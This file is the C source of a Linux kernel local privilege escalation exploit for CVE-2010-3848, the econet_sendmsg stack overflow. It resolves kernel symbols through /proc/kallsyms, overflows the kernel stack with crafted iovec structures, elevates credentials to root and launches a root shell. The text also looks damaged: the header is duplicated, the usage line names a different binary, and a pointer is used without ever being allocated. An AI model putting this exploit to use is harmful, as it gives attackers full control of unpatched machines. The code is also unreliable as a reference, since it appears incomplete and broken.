/*
 * quarter-nelson.c
 * Linux Kernel < 2.6.36.2 Econet Sendmsg Privilege Escalation Exploit
 * x86_64 / untested on 32bit yet but shuld be ok
 *
 * CVE-2010-3848
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3848
 *   Stack-based buffer overflow in the econet_sendmsg function in 
 *   net/econet/af_econet.c in the Linux kernel before 2.6.36.2, when an 
 *   econet address is configured, allows local users to gain privileges by 
 *   providing a large number of iovec structures.
 *
 * Usage:
 *   $ gcc quarter-nelson.c -o quarter-nelson -lrt
 *   $ ./half-nelson
 */
/*
 * quarter-nelson.c
 * Linux Kernel < 2.6.36.2 Econet Sendmsg Privilege Escalation Exploit
 * x86_64 / untested on 32bit yet but shuld be ok
 *
 * CVE-2010-3848
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3848
 *   Stack-based buffer overflow in the econet_sendmsg function in
 *   net/econet/af_econet.c in the Linux kernel before 2.6.36.2, when an
 *   econet address is configured, allows local users to gain privileges by
 *   providing a large number of iovec structures.
 *
 * Usage:
 *   $ gcc quarter-nelson.c -o quarter-nelson -lrt
 *   $ ./half-nelson
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <syscall.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <net/if.h>

#define IOVS           446
#define NPROC          1024
#ifndef PF_ECONET
#define PF_ECONET 19
#endif
#define STACK_OFFSET   6
#define RESTART_OFFSET 40

struct ec_addr {
        unsigned char station;
        unsigned char net;
};

struct sockaddr_ec {
	unsigned short sec_family;
	unsigned char port;
	unsigned char cb;
	unsigned char type;
	struct ec_addr addr;
	unsigned long cookie;
};

union semun {
	int val;
	struct semid_ds *buf;
	unsigned short *array;
	struct seminfo *__buf;
};

struct region {
	unsigned long parent;
	unsigned long addrs[NPROC];
};
struct region *region;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long ia32_sysret;

void __attribute__((regparm(3)))
kernel_code(void) {
commit_creds(prepare_kernel_cred(0));
}

void payload_parent(void) {
        asm volatile (
        "mov $kernel_code, %rax\n"
        "call *%rax\n"
        );
}

void payload_child(void) {
        asm volatile (
        "movq $payload_parent, (%0)\n"
        "jmpq *%1\n"
        :
        : "r"(region->parent + RESTART_OFFSET), "r"(ia32_sysret)
        );
}

unsigned long get_symbol(char *name) {
        FILE *f;
        unsigned long addr;
        char dummy, sym[512];
        int ret = 0;
        f = fopen("/proc/kallsyms", "r");
        if (!f) {
        return 0;
        }
        while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
        if (ret == 0) {
        fscanf(f, "%s\n", sym);
        continue;
        }
        if (!strcmp(name, sym)) {
        printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
        fclose(f);
        return addr;
        }
        }
        fclose(f);
        return 0;
}

void do_it(void) {
        int i, ret, eco_sock;
        struct sockaddr_ec eco_addr;
        struct msghdr eco_msg;
        struct iovec iovs[IOVS];
        struct ifreq ifr;
        char *target;
        target = (char *) payload_child;
        target += 4;
        sleep(1);
        for (i = 0; i < STACK_OFFSET; ++i) {
        iovs[i].iov_base = (void *) 0x0;
        iovs[i].iov_len = 0;
        }
        iovs[STACK_OFFSET].iov_base = (void *) target;
        iovs[STACK_OFFSET].iov_len = 0x0246;
        for (i = STACK_OFFSET + 1; i < IOVS; ++i) {
        iovs[i].iov_base = (void *) 0xffffffff00000000;
        iovs[i].iov_len = 0;
        }
        eco_sock = socket(PF_ECONET, SOCK_DGRAM, 0);
        if (eco_sock < 0) {
        printf("[-] failed creating econet socket, aborting\n");
        exit(1);
        }
        memset(&ifr, 0, sizeof(ifr));
        strcpy(ifr.ifr_name, "lo");
        ret = ioctl(eco_sock, SIOCSIFADDR, &ifr);
        if (ret != 0) {
        printf("[-] failed setting interface address, aborting\n");
        exit(1);
        }
        memset(&eco_addr, 0, sizeof(eco_addr));
        memset(&eco_msg, 0, sizeof(eco_msg));
        eco_msg.msg_name = &eco_addr;
        eco_msg.msg_namelen = sizeof(eco_addr);
        eco_msg.msg_flags = 0;
        eco_msg.msg_iov = &iovs[0];
        eco_msg.msg_iovlen = IOVS;
        printf("[+] triggering stack overflow\n");
        ret = sendmsg(eco_sock, &eco_msg, 0);
        if (ret != -1 || errno != EFAULT) {
        printf("[-] sendmsg succeeded\n");
        exit(1);
        }
        close(eco_sock);
        printf("[+] escalating privileges\n");
        syscall(__NR_restart_syscall);
        if (getuid() != 0) {
        printf("[-] escalation failed, aborting\n");
        exit(1);
        }
        printf("[+] launching root shell!\n");
        execl("/bin/sh", "/bin/sh", NULL);
}

int main(int argc, char **argv) {
        int type;
        printf("[+] looking for symbols\n");
        commit_creds = (_commit_creds) get_symbol("commit_creds");
        if (!commit_creds) {
        printf("[-] symbol table not available, aborting!\n");
        exit(1);
        }
        prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
        if (!prepare_kernel_cred) {
        printf("[-] symbol table not available, aborting\n");
        exit(1);
        }
        ia32_sysret = get_symbol("ia32_sysret");
        if (!ia32_sysret) {
        printf("[-] symbol table not available, aborting\n");
        exit(1);
        }
        printf("~~ (PF)Econet priv escalation (based on the j.o three-tier half-nelson) IA32+32bit by xd--@haxnet ~~\n");
        do_it();
        return 0;
}